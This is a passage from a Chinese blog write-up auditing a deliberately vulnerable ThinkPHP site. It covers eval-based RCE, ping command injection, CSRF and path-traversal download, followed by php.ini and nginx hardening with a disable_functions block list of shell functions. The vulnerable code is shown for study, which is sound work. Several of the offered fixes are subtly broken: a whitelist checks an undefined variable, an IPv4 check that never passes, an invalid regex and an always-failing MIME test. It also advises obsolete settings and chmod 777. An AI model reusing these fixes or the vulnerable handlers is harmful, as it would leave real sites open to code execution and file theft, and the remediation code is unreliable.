<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420161125127.png" alt="image-20210420161125127" style="zoom:50%;">

<h2 id="9-RCE"><a href="#9-RCE" class="headerlink" title="9.RCE"></a>9.RCE</h2><h3 id="漏洞点一-8"><a href="#漏洞点一-8" class="headerlink" title="漏洞点一"></a><strong>漏洞点一</strong></h3><h4 id="代码分析-12"><a href="#代码分析-12" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>application\admin\phpinfo\index</code></p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isPost</span>())&#123;
	   	<span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-string">&#x27;data&#x27;</span>);

	   	<span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$data</span>.<span class="hljs-string">&#x27;;&#x27;</span>);
	   &#125;
	   <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();
&#125;</code></pre>

<p><code>eval()</code>函数将传进来的字符串当作php代码执行，导致了命令执行</p>
<h4 id="漏洞防御-13"><a href="#漏洞防御-13" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>既然功能就是查看phpinfo，那就设置一个白名单，检查提交的值是否为phpinfo</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">   </span>&#123;
       <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isPost</span>())&#123;
   	   	<span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-string">&#x27;data&#x27;</span>);
		<span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;phpinfo&#x27;</span>);
       	<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
           	<span class="hljs-keyword">return</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$data</span>.<span class="hljs-string">&#x27;;&#x27;</span>);
       	&#125; <span class="hljs-keyword">else</span> &#123;
           	<span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;Hacker!&quot;</span>);
       	&#125;
   	&#125;
   	   <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();
   &#125;</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420161650236.png" alt="image-20210420161650236"></p>
<p><strong>漏洞点二</strong></p>
<h4 id="代码分析-13"><a href="#代码分析-13" class="headerlink" title="代码分析"></a>代码分析</h4><pre><code class="hljs php">     <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isPost</span>()) &#123;
         <span class="hljs-variable">$ip</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-string">&#x27;data&#x27;</span>);
         <span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$ip</span>);
<span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;
         <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$ip</span>) &amp;&amp; <span class="hljs-variable">$ip</span> !== <span class="hljs-string">&#x27;&#x27;</span>)
         &#123;
             <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping &#x27;</span>.<span class="hljs-variable">$ip</span>);
             <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$result</span>&lt;/pre&gt;&quot;</span>;
         &#125;
     &#125;</code></pre>

<p>可以看到，这里没有对用户提交的ip地址进行任何检查判断，导致攻击者可以使用管道符恶意的拼接命令，从而导致了命令注入，获取到服务的敏感资源。</p>
<h3 id="漏洞点二-8"><a href="#漏洞点二-8" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><h4 id="漏洞防御-14"><a href="#漏洞防御-14" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p><strong>方法一</strong></p>
<p>对用户提交的ip的地址进行判断，只有当符合IPv4的地址格式时，才允许执行下一步操作。</p>
<p>具体代码如下</p>
<pre><code class="hljs php">    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isPost</span>()) &#123;
    <span class="hljs-variable">$ip</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-string">&#x27;data&#x27;</span>);
    <span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$ip</span>);
    <span class="hljs-variable">$is_ip</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;
    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-variable">$ip</span>); <span class="hljs-comment">// 利用ipv4地址的特性检查</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$data</span>); <span class="hljs-variable">$i</span>++)&#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>] &gt; <span class="hljs-number">255</span> )
        &#123;
            <span class="hljs-variable">$is_ip</span> = <span class="hljs-literal">false</span>;
        &#125;
    &#125;
    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$is_ip</span>)&#123;
        <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;请输入正确的IPv4地址！&quot;</span>;
    &#125;
    <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping -c 4&#x27;</span>.<span class="hljs-variable">$ip</span>);
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$result</span>&lt;/pre&gt;&quot;</span>;
&#125;</code></pre>



<p><strong>方法二</strong></p>
<p>使用php内置的函数对提交的参数进行过滤和转义，使得攻击者输入的一些特殊字符失去原来的作用。</p>
<p><code>escapeshellcmd</code>和<code>escapeshellarg</code>函数</p>
<pre><code class="hljs php">     <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isPost</span>()) &#123;
         <span class="hljs-variable">$ip</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-string">&#x27;data&#x27;</span>);
         <span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$ip</span>);
         <span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$ip</span>);
         <span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$ip</span>);

<span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;
         <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$ip</span>) &amp;&amp; <span class="hljs-variable">$ip</span> !== <span class="hljs-string">&#x27;&#x27;</span>)
         &#123;
             <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping &#x27;</span>.<span class="hljs-variable">$ip</span>);
             <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$result</span>&lt;/pre&gt;&quot;</span>;
         &#125;
     &#125;</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420163850706.png" alt="image-20210420163850706" style="zoom:67%;">

<h2 id="10-CSRF"><a href="#10-CSRF" class="headerlink" title="10.CSRF"></a>10.CSRF</h2><h3 id="漏洞点一-9"><a href="#漏洞点一-9" class="headerlink" title="漏洞点一"></a><strong>漏洞点一</strong></h3><h4 id="代码分析-14"><a href="#代码分析-14" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>application\member\controller\Member.php</code>中的<code>jifen</code>方法</p>
<h4 id="漏洞防御-15"><a href="#漏洞防御-15" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>首先在前端代码中加入<code>&#123;:token&#125;</code>，让用户每次访问时都携带一个随机token，再在后端页面中检查该token是否正确</p>
<pre><code class="hljs php">
<span class="hljs-variable">$token</span> = [<span class="hljs-string">&#x27;__token__&#x27;</span>=&gt; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;__token__&#x27;</span>]];
         <span class="hljs-comment">// 设置检查规则</span>
         <span class="hljs-variable">$rule</span> = [
             <span class="hljs-string">&#x27;__token__&#x27;</span>    =&gt; <span class="hljs-string">&#x27;require|token&#x27;</span>,
         ];
         <span class="hljs-comment">// 利用validata函数检查</span>
         <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">validate</span>(<span class="hljs-variable">$token</span>, <span class="hljs-variable">$rule</span>);
         <span class="hljs-comment">// token检查不通过则直接退出，并警告站点不安全。</span>
         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> !== <span class="hljs-literal">true</span>)&#123;
             <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;website is unsafe!&quot;</span>);
         &#125;</code></pre>



<h3 id="漏洞点二，三，四"><a href="#漏洞点二，三，四" class="headerlink" title="漏洞点二，三，四"></a><strong>漏洞点二，三，四</strong></h3><h4 id="代码分析-15"><a href="#代码分析-15" class="headerlink" title="代码分析"></a>代码分析</h4><p>代码位置<code>application\member\controller\Member.php</code>中的<code>edit</code>方法 </p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">edit</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">   </span>&#123;
       <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isPost</span>()) &#123;
           <span class="hljs-variable">$userid</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">param</span>(<span class="hljs-string">&#x27;id/d&#x27;</span>, <span class="hljs-number">0</span>);
           <span class="hljs-variable">$data</span>   = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">post</span>();
           <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">validate</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;member.edit&#x27;</span>);

           <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> !== <span class="hljs-variable">$result</span>) &#123;
               <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$result</span>);
           &#125;
           ...</code></pre>

<p>上面的代码只是对提交的数据进行了检查，数据符合规则就会成功，但是没有对请求的来源做任何的检查，这也是做成CSRF漏洞的最大原因。</p>
<h4 id="漏洞防御-16"><a href="#漏洞防御-16" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>CSRF漏洞的防御</p>
<ul>
<li>设置token，与管理员登录页面一样，每次请求的前端页面都会隐藏一个随机产生的token，而在提交请求时这个token也会发送到后端，此时服务器会检查，提交的token是否正确，只有正确时才会进行下一步操作。</li>
<li>referer代表着请求的来源，不可以伪造。但是浏览器可以关闭referer。</li>
<li>禁止第三方网站使用本站Cookie。但是只有个别的浏览器支持。</li>
</ul>
<p>所以这里选择使用token，修复该漏洞。</p>
<p>前端代码</p>
<p>基本不需要修改，只需要增加一个隐藏的token值，代码位置<code>application\member\view\member\edit.html</code></p>
<p>此时的前端页面就会产生一个新标签，就是token值</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408161709609.png" alt="image-20210408161709609" style="zoom:67%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408161749800.png" alt="image-20210408161749800" style="zoom: 67%;"></p>
<p>后端代码</p>
<p><code>application\member\controller\Member.php</code>中的<code>edit</code>方法 </p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">edit</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">   </span>&#123;
       <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isPost</span>()) &#123;
           <span class="hljs-variable">$userid</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">param</span>(<span class="hljs-string">&#x27;id/d&#x27;</span>, <span class="hljs-number">0</span>);
           <span class="hljs-variable">$data</span>   = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">post</span>();
         
		<span class="hljs-comment">// 获取前端的token值</span>
           <span class="hljs-variable">$token</span> = [<span class="hljs-string">&#x27;__token__&#x27;</span>=&gt; <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;__token__&#x27;</span>]];
           <span class="hljs-comment">// 设置检查规则</span>
           <span class="hljs-variable">$rule</span> = [
               <span class="hljs-string">&#x27;__token__&#x27;</span>    =&gt; <span class="hljs-string">&#x27;require|token&#x27;</span>,
           ];
           <span class="hljs-comment">// 利用validata函数检查</span>
           <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">validate</span>(<span class="hljs-variable">$token</span>, <span class="hljs-variable">$rule</span>);
           <span class="hljs-comment">// token检查不通过则直接退出，并警告站点不安全。</span>
           <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> !== <span class="hljs-literal">true</span>)&#123;
               <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;website is unsafe!&quot;</span>);
           &#125;
           <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">validate</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;member.edit&#x27;</span>);

           <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> !== <span class="hljs-variable">$result</span>) &#123;
               <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$result</span>);
           &#125;
           ...</code></pre>

<p>再使用bp抓包生成CSRF的poc，此时就不能成功了</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408162254519.png" alt="image-20210408162254519" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408160213558.png" alt="image-20210408160213558" style="zoom: 50%;"></p>
<h2 id="11-任意文件下载-1"><a href="#11-任意文件下载-1" class="headerlink" title="11.任意文件下载"></a>11.任意文件下载</h2><h3 id="代码分析-16"><a href="#代码分析-16" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位于<code>application\download\controller\Index.php</code>中的index方法</p>
<pre><code class="hljs php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">  </span>&#123;
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);
      <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">isGet</span>() &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] !== <span class="hljs-literal">null</span>)&#123;
          <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] !== <span class="hljs-string">&#x27;&#x27;</span>)&#123;
              <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];
              <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;nba/&quot;</span>.<span class="hljs-variable">$filename</span>;
              <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;utf-8&quot;</span>,<span class="hljs-string">&quot;gb2312&quot;</span>,<span class="hljs-variable">$filename</span>);
              <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;
                  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;文件不存在！&quot;</span>);
              &#125;
              <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;rb&#x27;</span>);
              <span class="hljs-variable">$file_size</span> = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filename</span>);
              <span class="hljs-title function_ invoke__">ob_clean</span>();
              <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);
              <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Accept-Ranges: bytes&quot;</span>);
              <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Accept-Length:&quot;</span>.<span class="hljs-variable">$file_size</span>);
              <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=&quot;</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>));
              <span class="hljs-variable">$buffer</span>=<span class="hljs-number">1024</span>;
              <span class="hljs-variable">$file_count</span>=<span class="hljs-number">0</span>;
              <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>) &amp;&amp; <span class="hljs-variable">$file_count</span>&lt;<span class="hljs-variable">$file_size</span>)&#123;
                  <span class="hljs-variable">$file_con</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$buffer</span>);
                  <span class="hljs-variable">$file_count</span>+=<span class="hljs-variable">$buffer</span>;
                  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file_con</span>;
              &#125;
              <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);
              <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">view</span>();
          &#125;
      &#125;

      <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">view</span>();
  &#125;</code></pre>

<p>这里就是实现了一个图片下载的方法，使得用户可以下载<code>public/nba</code>文件夹下的图片，但是并没有对提交的<code>filename</code>参数进行检查和过滤，那么攻击者就可以利用<code>../</code>实现目录的跳转，从而可以下载任意文件</p>
<h3 id="漏洞防御-17"><a href="#漏洞防御-17" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>主要的防御方法就是限制用户输入的文件名在程序指定的目录下，那么就是不能使用<code>../</code>进行目录的跳转，并且对用户下载的文件后缀名进行检查</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_file</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-variable">$filename</span>))&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);
    &#125;
    <span class="hljs-comment">// 获取文件的MIME 检查是否符合图片类型的要求</span>
    <span class="hljs-variable">$file_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-variable">$filename</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type</span> !== <span class="hljs-string">&#x27;image/jpeg&#x27;</span> || <span class="hljs-variable">$file_type</span> !== <span class="hljs-string">&#x27;image/png&#x27;</span>|| <span class="hljs-variable">$file_type</span> !== <span class="hljs-string">&#x27;image/gif&#x27;</span>)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);
    &#125;
&#125;</code></pre>



<h2 id="12-unserialize-1"><a href="#12-unserialize-1" class="headerlink" title="12.unserialize"></a>12.unserialize</h2><p>由于这里的反序列化漏洞是一个ctf题目，如果修复了就失去了它了存在的意义，所以这里没有修复方法。但是针对于一般的unserilize，还是有很多防御方法的。</p>
<ul>
<li>1.严格的把控 unserailize() 函数的参数，不要给攻击者任何输入的可能</li>
<li>2.在文件系统函数的参数可控时，对参数进行严格的过滤。</li>
<li>3.严格检查上传文件的内容，而不是只检查文件头。</li>
<li>4.在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li>
</ul>
<p>而对于这种框架类型的网站,则需要开发者注意使用安全的网站架构,发现漏洞后需要及时修复漏，并且不安全的序列化后的对象，减少使用<code>system,eval</code>等可能被攻击者利用的函数。</p>
<h2 id="13-服务器安全配置防御漏洞"><a href="#13-服务器安全配置防御漏洞" class="headerlink" title="13.服务器安全配置防御漏洞"></a>13.服务器安全配置防御漏洞</h2><h3 id="php-ini配置"><a href="#php-ini配置" class="headerlink" title="php.ini配置"></a>php.ini配置</h3><ul>
<li><p><strong>禁止使用的PHP危险函数：</strong>Web木马程序通常利用php的特殊函数执行系统命令，查询任意目录文件，增加修改删除文件等。php木马程序常使用的函数为：dl,assert,exec,popen,system,passthru,shell_exec等</p>
<p>在php.ini中添加如下的内容：</p>
<pre><code class="hljs hsp">disable_functions = dl,<span class="hljs-keyword">assert</span>,<span class="hljs-keyword">exec</span>,popen,<span class="hljs-keyword">system</span>,passthru,shell_exec,proc_close,proc_open,pcntl_exec</code></pre>
</li>
<li><p><strong>关闭注册全局变量：</strong>在PHP中提交的变量，包括使用POST或者GET提交的变量，会自动注册为全局变量，能够直接访问，这是对服务器非常不安全的，所以不能让它注册为全局变量，就把注册全局变量选项关闭。</p>
<p>关闭注册<strong>全局变量</strong>设置：</p>
<pre><code class="hljs ini"><span class="hljs-attr">register_globals</span>  = <span class="hljs-literal">Off</span></code></pre>


</li>
<li><p><strong>开启magic_quotes_gpc</strong>：magic_quotes_gpc会把引用的数据中包含单引号’和双引号”以及反斜线 \自动加上反斜线，自动转译符号，确保数据操作的正确运行，magic_quotes_gpc的设定值将会影响通过Get&#x2F;Post&#x2F;Cookies获得的数据，可以有效的防止SQL注入漏洞。</p>
<p>打开magic_quotes_gpc设置：</p>
<pre><code class="hljs ini"><span class="hljs-attr">magic_quotes_gpc</span> = <span class="hljs-literal">On</span></code></pre>
</li>
<li><p><strong>关闭错误消息显示：</strong>php在没有连接到数据库或者其他情况下会有提示错误，一般错误信息中会包含php脚本当前的路径信息或者查询的SQL语句等信息，这类信息提供给黑客后，是不安全的，所以服务器建议禁止错误提示。</p>
<p>关闭错误信息显示设置：</p>
<pre><code class="hljs ini"><span class="hljs-attr">display_errors</span> = <span class="hljs-literal">Off</span></code></pre>
</li>
<li><p>**禁止访问远程文件:**允许访问URL远程资源使得PHP应用程序的漏洞变得更加容易被利用，php脚本若存在远程文件包含漏洞可以让攻击者直接获取网站权限及上传web木马</p>
<p>配置如下：</p>
<pre><code class="hljs ini"><span class="hljs-attr">allow_url_fopen</span> =  <span class="hljs-literal">Off</span>
<span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">Off</span></code></pre>
</li>
<li><p><strong>开启php安全模式：</strong>php的安全模式是个非常重要的内嵌的安全机制，能够控制一些php中的函数，比如system()，同时把很多文件操作函数进行了权限控制，也不允许对某些关键文件的读取。</p>
<pre><code class="hljs ini"><span class="hljs-attr">safe_mode</span> = <span class="hljs-literal">On</span></code></pre></li>
</ul>
<h3 id="nginx服务器安全配置"><a href="#nginx服务器安全配置" class="headerlink" title="nginx服务器安全配置"></a>nginx服务器安全配置</h3><p>修改<code>nginx.conf</code></p>
<ul>
<li><p>禁止敏感文件的直接访问，可以有效的防御文件上传攻击，修改server段</p>
<pre><code class="hljs coq">location ~ ^/(uploads|<span class="hljs-type">static</span>)/.*.(php|<span class="hljs-type">php3</span>|<span class="hljs-type">php4</span>|<span class="hljs-type">php5</span>|<span class="hljs-type">cgi</span>|<span class="hljs-type">asp</span>|<span class="hljs-type">aspx</span>|<span class="hljs-type">jsp</span>|<span class="hljs-type">shtml</span>|<span class="hljs-type">shtm</span>|<span class="hljs-type">pl</span>|<span class="hljs-type">cfm</span>|<span class="hljs-type">sql</span>|<span class="hljs-type">mdb</span>|<span class="hljs-type">dll</span>|<span class="hljs-type">exe</span>|<span class="hljs-type">com</span>|<span class="hljs-type">inc</span>|<span class="hljs-type">sh</span>)$ &#123;
   deny all;
&#125;</code></pre>
</li>
<li><p>禁止危险IP的访问</p>
<pre><code class="hljs awk"><span class="hljs-regexp">//</span>禁止的写法
deny <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span>;
 
<span class="hljs-regexp">//</span>允许的写法
allow <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span>; 
deny all;</code></pre>
</li>
<li><p>隐藏版本信息</p>
<pre><code class="hljs nginx"><span class="hljs-attribute">server_tokens</span>   <span class="hljs-literal">off</span>;
<span class="hljs-attribute">proxy_hide_header</span>        X-Powered-By</code></pre></li>
</ul>
<h3 id="代码安全"><a href="#代码安全" class="headerlink" title="代码安全"></a>代码安全</h3><ul>
<li>config&#x2F;app.php中的app_debug和app_trace设置false，关闭调试模式</li>
<li>默认是域名绑定在public目录，为唯一对外访问目录</li>
<li>务必更改默认密码，并不要设置的过于简单，防止暴力破解</li>
<li>后台禁止访问IP，可以在设置-网站设置中设置</li>
</ul>
<h1 id="问题与总结"><a href="#问题与总结" class="headerlink" title="问题与总结"></a>问题与总结</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
<li>数据库连接失败</li>
</ul>
<pre><code class="hljs css">SQLSTATE<span class="hljs-selector-attr">[HYO00]</span><span class="hljs-selector-attr">[2002]</span> Connection refused</code></pre>

<p>解决方法如下</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210311195551767.png" alt="image-20210311195551767"></p>
<ul>
<li>数据库关闭</li>
</ul>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210311200511035.png" alt="image-20210311200511035" style="zoom: 67%;">



<p>上面的错误是mysql数据库的容器关闭导致</p>
<p>但是重启时还是立即关闭</p>
<p>查看日志看到如下内容，百度解决</p>
<pre><code class="hljs applescript">root@sunzy-virtual-machine:~<span class="hljs-comment"># docker logs -f 250c80740b5b</span>
Warning: World-writable config <span class="hljs-built_in">file</span> &#x27;/etc/mysql/conf.d/<span class="hljs-keyword">my</span>.cnf&#x27; <span class="hljs-keyword">is</span> ignored
Warning: World-writable config <span class="hljs-built_in">file</span> &#x27;/etc/mysql/conf.d/<span class="hljs-keyword">my</span>.cnf&#x27; <span class="hljs-keyword">is</span> ignored
Warning: World-writable config <span class="hljs-built_in">file</span> &#x27;/etc/mysql/conf.d/<span class="hljs-keyword">my</span>.cnf&#x27; <span class="hljs-keyword">is</span> ignored</code></pre>

<p>将mysql文件夹中的my.cnf的权限改为 644 </p>
<pre><code class="hljs apache"><span class="hljs-attribute">chmon</span> <span class="hljs-number">644</span> my.cnf</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210311203031485.png" alt="image-20210311203031485"></p>
<ul>
<li>网站的图片无法显示或者css,js代码无法执行</li>
</ul>
<p>进入nginx服务器的容器内</p>
<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> 容器名 bash</code></pre>

<p>cd 进入图片或者css js代码保存的文件夹</p>
<p>使用chmod改变权限</p>
<pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> -R <span class="hljs-number">777</span> 文件夹  # -R  参数是递归改变权限 即文件夹内的文件都有<span class="hljs-number">777</span> 的权限</code></pre>



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
